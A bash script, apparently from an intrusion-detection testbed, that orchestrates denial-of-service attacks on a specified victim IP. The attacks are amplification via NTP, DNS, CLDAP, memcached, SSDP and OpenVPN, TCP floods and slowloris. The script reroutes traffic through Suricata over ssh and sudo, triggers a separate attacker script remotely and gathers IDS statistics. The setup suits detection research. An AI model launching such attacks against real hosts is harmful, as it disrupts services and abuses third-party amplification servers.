#!/bin/bash

source ./config.sh

ATTACK_VECTOR=
VICTIM_IP=
LOOPS=  # number of loops/pakets to be done/sent
ATTACK_TYPE=

GREEN='\033[0;32m' # Green Color
YELLOW='\033[0;33m'
RED='\033[0;31m' # RED Color
NC='\033[0m' # No Color

__POSSIBLE_ATTACK_VECTOR=("ntp" "dns" "cldap" "memcached" "openvpn"
                            "flood-syn" "flood-ack" "flood-rst" "floods"
                            "ssdp" "slowloris")
__POSSIBLE_ATTACK_TYPE=("querry" "response" "flood" "slow")




print_help() {
    #
    # Help message
    #
    echo -e "${GREEN}Usage: launch_attack.sh [-a attack-vector] [-t attack-type] [-d victim-ip] [-l loops]"
    echo    "  Options are:"
    echo    "  -a, --attack-vector: ntp, dns, openvpn, cldap, memcached, flood-syn,"
    echo    "                       flood-ack, flood-rst, floods, ssdp, slowloris."
    echo    ""
    echo    "  -d, --victim-ip:     IPv4 address of a victim."
    echo    ""
    echo    "  -l, --loops:         number of loops or time, how long the attack is in progress (recomded '1' if unsure)."
    echo    "                       Can be different for each attack vector."
    echo    ""
    echo    "  -t, --attack-type:   Have to correspond to the attack-vector."
    echo    "                       AMP attacks: 'querry' or 'response',"
    echo    "                       Floods: 'flood',"
    echo -e "                       Slowloris: 'slow'.${NC}"
}

check_arguments() {
    #
    # Check arguments
    #
    while [[ $# -gt 0 ]]
    do
    case "$1" in
        -a|--attack-vector)
            if [[ ! " ${__POSSIBLE_ATTACK_VECTOR[@]} " =~ " ${2} " ]]; then
                echo -e "${RED}Invalid attack vector argument: '$2'!${NC}"
                print_help
                exit 1
            fi
            ATTACK_VECTOR="$2"
            shift 2    # past argument
            ;;
        -t|--attack-type)
            if [[ ! " ${__POSSIBLE_ATTACK_TYPE[@]} " =~ " ${2} " ]]; then
                echo -e "${RED}Invalid attack type argument: '$2'!${NC}"
                print_help
                exit 1
            fi
            ATTACK_TYPE="$2"
            shift 2
            ;;
        -d|--victim-ip)
            VICTIM_IP="$2"
            shift 2
            ;;
        -l|--loops)
            LOOPS="$2"
            shift 2
            ;;
        -h|--help)
            print_help
            exit 0
            ;;
        *)  # unknown option
            echo -e "${RED} Wrong arguments!${NC}"
            print_help
            exit 1
            ;;
    esac
    done
}

modify_host_pre_attack() {
    #
    # Modify host before attack
    #
    echo -e '${YELLOW}This attack uses outer network servers'
    echo 'Host pc has to be modified to route incomming network traffic through Suricata'
    echo 'After the attack changes will be reverted'
    echo 'Root access is needed!${NC}'

    # set up host-pc routing table
    sudo /sbin/ip route del "$VICTIM_NETWORK"
    sudo /sbin/ip route add "$VICTIM_NETWORK" via "$SURICATA_IP"
    /sbin/ip route
    echo "Waiting 2 secnods for changes to take affect..."
    sleep 2
}

modify_host_post_attack() {
    #
    # Revert changes made to host-pc after the attack
    #
    echo '${YELLOW}Reverting changes made to host-pc...${NC}'
    sudo /sbin/ip route del "$VICTIM_NETWORK" via "$SURICATA_IP"
    sudo /sbin/ip route add "$VICTIM_NETWORK" via "$HOST_PC_VICTIM_NETWORK_GW"
}

restart_suricata() {
    #
    # Restart suricata service
    #
    ssh -l "$SURICATA_USR" "$SURICATA_IP" \
        "systemctl restart suricata && echo 'Suricata restarted...'"
}

get_suricata_stats() {
    #
    # Get statistics from suricata
    #
    /bin/bash ./stats_suricata.sh
}

do_attack() {
    #
    # Connect to the attacker and do the attack
    #
    ssh -l "$ATTACKER_USR" "$ATTACKER_IP" \
        VICTIM_IP="$VICTIM_IP" \
        LOOPS="$LOOPS" \
        VICTIM_NETWORK=$VICTIM_NETWORK \
        SURICATA_IP=$SURICATA_IP \
        AMP_SERVER_IP=$AMP_SERVER_IP \
        ATTACK_VECTOR="$ATTACK_VECTOR" \
        ATTACK_TYPE="$ATTACK_TYPE" \
        /bin/bash < "attacker_steps.sh"
}

start_http_server() {
    #
    # Connect to the Vicitm IP and starts HTTP Server there on port 80
    #
    echo 'Creating new http server listening on port 80...'
    ssh -l "$VICTIM_USR" "$VICTIM_IP" \
        "tmux new-session -s my_http_server -d 'python -m ComplexHTTPServer 80 >/var/log/my_http_server.out'; \
            sleep 2; tmux has-session -t my_http_server"
    test $? -eq 1 && { echo "Failed to create server, exiting!"; exit 1; }
    echo "Server successfully created!"
}

stop_http_server() {
    #
    # Stop HTTP server
    #
    echo 'Stopping http server on port 80...'
    ssh -l "$VICTIM_USR" "$VICTIM_IP" \
        "tmux kill-session -t my_http_server; tail /var/log/my_http_server.out"
    test $? -eq 0 && echo "Server stopped successfully!"
}



##### MAIN

check_arguments $@

test -z $ATTACK_VECTOR  && { echo -e "${RED}Attack vector not specified!${NC}"; exit 1; }
test -z $ATTACK_TYPE    && { echo -e "${RED}Attack type not specified!${NC}"; exit 1; }
test -z $VICTIM_IP      && { echo -e "${RED}Victim IP address not specified!${NC}"; exit 1; }
test -z $LOOPS          && { echo -e "${RED}Number of loops not specified!${NC}"; exit 1; }

case "$ATTACK_VECTOR" in
    cldap|dns)
        modify_host_pre_attack

        restart_suricata

        do_attack

        get_suricata_stats

        modify_host_post_attack
        ;;
    slowloris)
        start_http_server

        restart_suricata

        do_attack

        get_suricata_stats

        stop_http_server
        ;;
    *)
        restart_suricata

        do_attack

        get_suricata_stats
        ;;
esac
